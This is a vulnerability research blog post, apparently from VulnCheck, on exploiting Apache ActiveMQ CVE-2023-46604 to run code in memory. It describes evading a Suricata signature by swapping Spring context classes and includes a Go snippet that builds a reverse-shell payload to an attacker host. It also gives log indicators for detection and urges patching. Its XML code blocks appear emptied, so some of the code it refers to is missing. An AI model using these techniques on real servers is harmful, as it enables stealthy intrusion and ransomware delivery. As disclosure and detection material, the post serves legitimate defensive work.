---
title: "Executing from Memory Using ActiveMQ CVE-2023-46604 - Blog - VulnCheck"
date: 2023-11-15T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Executing from Memory Using ActiveMQ CVE-2023-46604 - Blog - VulnCheck

<br/>

<br/>
::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - CVE-2023-46604 allows attackers to execute arbitrary code from ActiveMQ’s memory, therefore avoiding most detections.\\n - There were no public details or detections for this exploitation method until this blog.\\n - A memory-resident attacker is very difficult to detect. It’s best to ensure your ActiveMQ instances are not internet-facing.\\n---\\n::\\n\\n## Introduction\\n\\n\[Huntress Labs\](https://www.huntress.com/blog/critical-vulnerability-exploitation-of-apache-activemq-cve-2023-46604), \[Rapid7\](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/), and \[ArticWolf\](https://arcticwolf.com/resources/blog/tellmethetruth-exploitation-of-cve-2023-46604-leading-to-ransomware/) all recently published reports of threat actors exploiting \[ActiveMQ\](https://activemq.apache.org/) \[CVE-2023-46604\](https://nvd.nist.gov/vuln/detail/CVE-2023-46604) to drop ransomware onto the victim host. The attackers used CVE-2023-46604 to invoke \`cmd.exe\` followed by \`curl.exe\` or \`msiexec.exe\` in order to download and execute their ransomware. The attackers were very obvious and caught the aforementioned companies' attention, all of which offer managed detection and response products. However, the attacks needn’t have been so noisy. In this blog, we will explore how an attacker can exploit CVE-2023-46604 and execute arbitrary code \*from memory\*.\\n\\n## Public Exploits\\n\\nThe threat actors all appeared to have relied on the public details for this vulnerability. The exploit was originally disclosed in a Chinese-language blog by \[X1R0z\](https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/) on October 25, 2023 and then re-analyzed by \[Stephen Fewer\](https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis) of Rapid7 on November 1, 2023. They both, more or less, came up with an exploit that used \[ClassPathXmlApplicationContext\](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/support/ClassPathXmlApplicationContext.html) to load an \[XML Bean\](https://docs.spring.io/spring-framework/docs/4.2.x/spring-framework-reference/html/xsd-configuration.html) that looks like this:\\n\\n\`\`\`xml\\n\\n \\n \\n \\n \\n cmd.exe\\n /c\\n calc.exe\\n \\n \\n \\n \\n\`\`\`\\n\\nThe above XML bean causes ActiveMQ to call \`java.langProcessBuilder(“cmd.exe”, “/c”, “calc.exe”);\` - resulting in ActiveMQ launching the calculator process. There have been quite a few other public exploits (\[Metasploit\](https://github.com/rapid7/metasploit-framework/pull/18501/files), \[Nuclei\](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/network/cves/2023/CVE-2023-46604.yaml), \[XDB-90299d8578e8\](https://vulncheck.com/xdb/90299d8578e8), \[XDB-07dca85f6442\](https://vulncheck.com/xdb/07dca85f6442), \[XDB-2a263bac5fa9\](https://vulncheck.com/xdb/2a263bac5fa9), \[XDB-c01880ea274b\](https://vulncheck.com/xdb/c01880ea274b), \[XDB-5f38a93c3fe0\](https://vulncheck.com/xdb/5f38a93c3fe0), \[XDB-0462e934919b\](https://vulncheck.com/xdb/0462e934919b), \[XDB-7adf2c60412f\](https://vulncheck.com/xdb/7adf2c60412f)) but none deviate from this path.\\n\\nThe perceived restriction is that the attacker must use a bean that accepts all of its configuration through its constructor and has a function that can be invoked via the \`init-method\` parameter (or \`destroy\`).\\n\\nHowever, none of those restrictions actually exist.\\n\\n## Creating a Better Exploit\\n\\nThe first detail worth noting is that the attacker doesn’t have to use \`ClassPathXmlApplicationContext\`. \[FileSystemXmlApplicationContext\](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/support/FileSystemXmlApplicationContext.html) works just fine. The output barely changes on the wire.\\n\\n!\[CVE-2023-46604 on the wire\](/blog/cve-2023-44604-activemq-in-memory/cve-2023-44604-otw.png){:width="100%"}\\n\\nIt’s important to note because existing network signatures (see \[sid:2049045\](https://rules.emergingthreats.net/open/suricata-6.0/emerging-all.rules)) rely on \`ClassPathXmlApplicationContext\` being present. So we get a simple signature bypass by using \`FileSystemXmlApplicationContext\`.\\n\\nWhen it comes to the XML bean, we don’t actually need most of what the public exploits use. We don’t need to construct a bean or invoke a function via \`init-method\`. We just need to use SpEL.\\n\\n\`\`\`xml\\n\\n \\n \\n \\n\\n\`\`\`\\n\\nIn the XML bean above, you can see that we’ve embedded a SpEL expression to invoke the Nashorn javascript engine and write a file to disk. The payload does not shell out to \`cmd.exe\` or \`bash\` to write to disk. It just uses the native functionality in the \`java.exe\` process. Spring, \[by design\](https://docs.spring.io/spring-framework/reference/core/expressions/beandef.html), allows for SpEL in bean definitions. As a feature, we can execute arbitrary code \*as the original process\*. We don’t need to shell out to a new process at all!\\n\\nThat means the threat actors could have avoided dropping their tools to disk. They could have just written their encryptor in Nashorn (or loaded a class/JAR into memory) and remained memory resident. Perhaps avoiding detection from the aforementioned managed EDR teams.\\n\\nHowever, if the attacker \*did\* do that, they’d also need to clean up the \`activemq.log\` because the above XML triggers the following log message (note that:\\n\\n> 2023-11-11 14:05:10,839 | WARN | Exception encountered during context initialization - canceling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'vulncheck' defined in URL \[http://10.9.49.131:8080/bppkArhoWrRn\]: Initialization of bean failed; nested exception is org.springframework.beans.factory.BeanExpressionException: Expression parsing failed; nested exception is org.springframework.expression.ExpressionInvocationTargetException: A problem occurred when trying to execute method 'eval' on object of type \[jdk.nashorn.api.scripting.NashornScriptEngine\] | org.springframework.context.support.FileSystemXmlApplicationContext | ActiveMQ Transport: tcp:///10.9.49.131:57484@61616\\n\\nGenerally speaking, you never want to see Nashorn in your logs. You really don’t want to see it associated with BeanCreation. Note that the nested exception will not always include a “Nashorn\` exception, so detection should occur around the remote BeanCreationException.\\n\\n## A Reverse Shell\\n\\nThe overarching objective of this blog was executing arbitrary code in memory. However, I’m informed people would be disappointed if they didn’t get a reverse shell payload. Remember, when you use this reverse shell, you are using \`bash\` or \`cmd.exe\`... which is the exact thing that caught Huntress, Rapid7, and ArticFox’s attention in the first place. But here you go anyway:\\n\\n\`\`\`go\\nxml := fmt.Sprintf(\`\\n \\n \\n \\n \`, b64.StdEncoding.EncodeToString(\[\]byte(payload.ReverseShellJJSScript(conf.Lhost, conf.Lport, conf.C2Type == c2.SSLShellServer))))\\n\\n\`\`\`\\n\\nNote that \[payload.ReverseShellJSSScript\](https://github.com/vulncheck-oss/go-exploit/blob/62833721dab65674281d5a82abe37816d742f358/payload/reverse.go#L81) is from \[go-exploit\](https://github.com/vulncheck-oss/go-exploit/tree/main), and automatically supports Windows and Linux targets, as well as encryption.\\n\\nThe whole thing looks like this on the wire:\\n\\n\`\`\`xml\\n\\n \\n \\n \\n\\n\`\`\`\\n\\n## Conclusion\\n\\nThere are currently more than \[ten thousand\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=INCLUDE&q=services.extended\_service\_name%3D%22ACTIVEMQ%22) of internet-facing ActiveMQ servers, and multiple organizations have reported ransomware attacks. Now that we know attackers can execute stealthy attacks using CVE-2023-46604, it’s become even more important to patch your ActiveMQ servers and, ideally, remove them from the internet entirely.\\n\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always looking to advance the state of attack on initial access vulnerabilities like CVE-2023-46604. For more research like this, see our blogs, \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce) and \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845). Sign up to start a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) product today.\\n

#### [Source](https://vulncheck.com/blog/cve-2023-44604-activemq-in-memory)

<br/>
---
